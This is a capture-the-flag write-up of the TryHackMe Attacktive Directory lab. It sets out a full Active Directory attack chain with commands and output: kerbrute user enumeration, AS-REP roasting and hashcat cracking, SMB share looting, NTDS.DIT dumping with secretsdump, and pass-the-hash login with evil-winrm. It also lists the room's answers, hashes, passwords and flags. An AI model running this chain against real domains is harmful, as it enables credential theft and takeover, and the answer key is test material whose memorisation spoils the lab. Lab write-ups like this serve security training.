### Attacktive Direct Room

Link to Room [here](https://tryhackme.com/room/attacktivedirectory)


i'll do it my way and at the final i'll answer all questions. Then maybe this writeup has some things that didn't need to be done but whatever

so, i'll search by the all three flags


	svc-admin
	backup
	Administrator

if you just want the answers to the tasks it's all down below ;)

ok, let's start

first i'll run nmap 

~~~
$ export ip=10.10.186.74
$ sudo nmap -sS -p- $ip -T3 -vv
~~~

jesus, how many ports open!

i prefer to run this command first and do -A -sC after at the open ports so it doesn't take too long. But as there are so many ports, i'll do everything in one command

~~~
$ sudo nmap -A -sC -sS -p- 10.10.186.74 -T3 -vv > fullscan.txt
~~~
until it doesn't finish, i'm going to look the web server, and it's the same thing in that relevant room: microsoft-ds!

winrm or Windows Remote Management is an http based remote management, if winrm is not enable to remote access, he only listen for local request in port 47001, the default ports is also 5985 and 5986

port 5985 is open and the service running on this is 'wsman'

i don't know what is this,let me search about this

 	WSMan provider for PowerShell allows you to add, change, clear and delete WS-Management configuration data on local or remote computers.


it's possible connect in this service using Connect-WSMan. But the documenatation also says that just windows powershell can do it, so...i don't but if later i don't have any idea later i'll try this

i had a lot of erros using enum4linux.pl so i decided use the python version but he couldn't anything

	[*] Checking LDAP
	[+] LDAP is accessible on 389/tcp
	[*] Checking LDAPS
	[+] LDAPS is accessible on 636/tcp
	[*] Checking SMB
	[+] SMB is accessible on 445/tcp
	[*] Checking SMB over NetBIOS
	[+] SMB over NetBIOS is accessible on 139/tcp

all i have is it.

ok, in port 88 have Kerberos.

blog [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)

documentation [here](https://learn.microsoft.com/pt-br/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)

kerberos blog [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication)

domain information:

	NetBIOS computer name: ATTACKTIVEDIREC
	NetBIOS domain name: THM-AD
	DNS domain: spookysec.local
	FQDN: AttacktiveDirectory.spookysec.local

on question 3 of task 3 has something interesting that i don't know, let me search about. 

ok,forget it,just my curiosity taking over, let's continue 

now,as i have kerberos open in port 88, i can brute force it using kerbrute

what this tool do is simple send a UDP frame to kerberos and see the response, is valid? is wrong ? exist ?

[kerbrute tool](https://github.com/ropnop/kerbrute/releases)


~~~bash
$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
~~~

this room provides to us a user-list.txt and an password-list.txt to make the process more fast so i'm going use both on bruteforce 

~~~
$ ./kerbrute_linux_amd64 userenum -d spookysec.local --dc $ip lists/userrlist.txt
~~~

or if you added this domain in your hosts file you don't need to specify '--dc'

~~~
2023/09/30 09:00:07 >  [+] VALID USERNAME:	 james@spookysec.local
2023/09/30 09:00:11 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2023/09/30 09:00:15 >  [+] VALID USERNAME:	 James@spookysec.local
2023/09/30 09:00:17 >  [+] VALID USERNAME:	 robin@spookysec.local
2023/09/30 09:00:34 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2023/09/30 09:00:45 >  [+] VALID USERNAME:	 administrator@spookysec.local
2023/09/30 09:01:08 >  [+] VALID USERNAME:	 backup@spookysec.local
2023/09/30 09:01:18 >  [+] VALID USERNAME:	 paradox@spookysec.local
2023/09/30 09:02:26 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2023/09/30 09:02:48 >  [+] VALID USERNAME:	 Robin@spookysec.local
~~~

now the room tell us to use GetNPUusers.py

~~~
$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.10.123.8 -no-pass -usersfile lists/userlist.txt
~~~
you may have to install a python version higher than 3.7 

and the response was it

~~~
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e7eb41c03275ced7e3dc28021947e41e$0273ab4e1274c45977041d25428fb67ec758ba46921e7b3edfb502a367e3fd76b298f31349d313400c6f06ae86d7b3dc16a1a5b9ce0962dde99fcd54da92c89ec44f428257c443e5e7dbb2e4a2641b089a4dcb6f6cec269235e7c491a6f6570a64a1ed1de15ef1a779a170cfdbc3c3a93cf567be2b0a3fab296e7684fdf86801111717d7434838810bfea709090d63ab2ce380677ab5a627299efec60c0c943f932a2ae5dbca76278d7b0bd6cfdb8c2bd47d8d729ec86d50178d062c90b9a993a30c1eb6c8bcd6bca3e30dd41191df219d068fb363fc543f541826d1ffe2f4fd5368b90da1d47244ce43222e170ae6f023a1
~~~

now i got an hashe, i'm going break it now

looking at this [site](https://hashcat.net/wiki/doku.php?id=example_hashes#generic_hash_types) i found what type of hash is it

i tought it was 7500 but i was wrong, it's the 18200

~~~
$ hashcat -a 0 -m 18200 hash.txt passwords.txt
~~~

now as i've got the password of svc-admin user i can login in some services and probaly have some new informations

~~~
$ ./enum4linux-ng.py -A -u svc-admin -p management2005 $ip -v
~~~

if you want to do this manually, you can take a look in wich commands enum4linux is running to get these informations using -v flag


ok, enum4linux found four 6 different shares,i'll try to connect to all of them to see if i can find something useful

and i found a txt file called by "backup_credentials.txt" on the backup share

~~~
$ smbclient \\\\$ip\\backup -u svc-admin%management2005
smb: \> get backup_credentials.txt
~~~

maybe the content is encode by something? i'm going try decode base64

~~~
$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
~~~

now the room tell us to use secretsdump.py from impacket and it is what i'm going to do 

~~~
$ /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@$ip
~~~

hmmm....

	[*] Using the DRSUAPI method to get NTDS.DIT secrets

this output interested me, let me search how this tool can leak all of these hashes 

blog about it [here](https://www.hackingarticles.in/credential-dumping-ntds-dit/)

just read an file that contains all information about the active directory so...it's more simple than i thought

now i have the hash to administrator and i'll use  the evil-winrm to connect to machine using the hash

~~~
# gem install evil-winrm
$ evil-winrm -i $ip -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
~~~ 

yep i finish ;)

it's a cool room but a little easy because of questions, if this rooms just tell us to find the flags i'd probaly take a lot longer :)

### Task1

just starting the machine and the vpn 

### Task2

i really don't know if i need to use this tools but if need to,i'll install it afte


### Task3

Question1: What tool will allow us to enumerate port 139/445?

r: enum4linux

Question2: What is the NetBIOS-Domain Name of the machine?

r: THM-AD

Question3: What invalid TLD do people commonly use for their Active Directory Domain?

r: .local


### Task4

Question1:What command within Kerbrute will allow us to enumerate valid usernames?

r: userenum

Question2:
What notable account is discovered? (These should jump out at you)

r: svc-admin

Question3:
What is the other notable account is discovered? (These should jump out at you)

r: backup


### Task5

Question1: We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

r:svc-admin

Question2: Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

r: kerberos 5 as-req etype 23

Question3:What mode is the hash?

r: 18200


Question4:Now crack the hash with the modified password list provided, what is the user accounts password?

r: management2005


### Task6

Question1:What utility can we use to map remote SMB shares?

r:smbclient

Question2:Which option will list shares?

r:-L

Question3:How many remote shares is the server listing?

r:6

Question4:There is one particular share that we have access to that contains a text file. Which share is it?

r:backup

Question5:What is the content of the file?

r:YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

Question6:Decoding the contents of the file, what is the full contents?

r:backup@spookysec.local:backup2517860

### Task7

Question1:What method allowed us to dump NTDS.DIT?

r:DRSUAPI

Question2:What is the Administrators NTLM hash?

r:0e0363213e37b94221497260b0bcb4fc

Question3:What method of attack could allow us to authenticate as the user without the password?

r:pass the hash

Question4:Using a tool called Evil-WinRM what option will allow us to use a hash?

r: -H

### Task8

Admin flag: 

~~~
TryHackMe{4ctiveD1rectoryM4st3r}
~~~

Backup Flag:
~~~
TryHackMe{K3rb3r0s_Pr3_4uth}
~~~

svc-admin Flag: 
~~~
TryHackMe{B4ckM3UpSc0tty!}
~~~




